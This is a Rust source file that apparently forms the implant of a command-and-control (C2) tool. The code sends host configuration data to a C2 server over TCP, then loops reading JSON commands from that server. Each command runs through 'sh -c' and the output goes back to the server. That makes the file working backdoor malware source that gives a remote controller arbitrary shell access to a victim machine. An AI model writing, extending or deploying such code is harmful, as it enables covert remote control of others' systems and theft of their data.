use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use crate::config::{Config, C2Command};

pub fn execute_command(cmd: &String) -> Result<String, String> {
    match Command::new("sh").arg("-c").arg(cmd).output() {
        Ok(output) => {
            if output.status.success() {
                Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
            } else {
                Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
            }
        },
        Err(e) => {
            Err(e.to_string())
        }
    }
}

pub fn send_sys_info(stream: &mut TcpStream) {
    let config = Config::new();
    let config_json = config.to_json().expect("Failed to serialize Config") + "\n";

    stream.write_all(config_json.as_bytes()).unwrap();
    stream.flush().unwrap();
}

pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
    // read command
    // deserialize command
    // execute command
    // send output to the C2 server
    let mut buffer: Vec<u8> = Vec::new();

    let mut reader = BufReader::new(stream.try_clone()?);

    loop {
        buffer.clear();
        match reader.read_until(b'\n', &mut buffer) {
            Ok(bytes_read) => {
                if bytes_read == 0 {
                    break;
                }

                let command_str = String::from_utf8_lossy(&buffer);

                match  serde_json::from_str::<C2Command>(&command_str) {
                    Ok(command) => {
                        println!("[I] Received command: {}", command.name);

                        match execute_command(&command.name) {
                            Ok(output) => {
                                let response = C2Command {
                                    name: command.name.clone(),
                                    output: Some(output),
                                };
                                let response_json = serde_json::to_string(&response).expect("Failed to serialize command response") + "\n";
                                stream.write_all(response_json.as_bytes())?;
                                stream.flush()?;
                            },
                            Err(e) => {
                                println!("[E] Error executing command: {}", e);
                            }
                        }
                    },
                    Err(e) => {
                        println!("[E] Failed to deserialize command: {}", e);
                    }
                }

            },
            Err(e) => {
                println!("[E] Error reading from stream: {}", e);
            }
        }
    }

    Ok(())
    // Listen for new command/instruction from C2
    // Call function received_instruction - executes the instruction + sends the output to C2
}
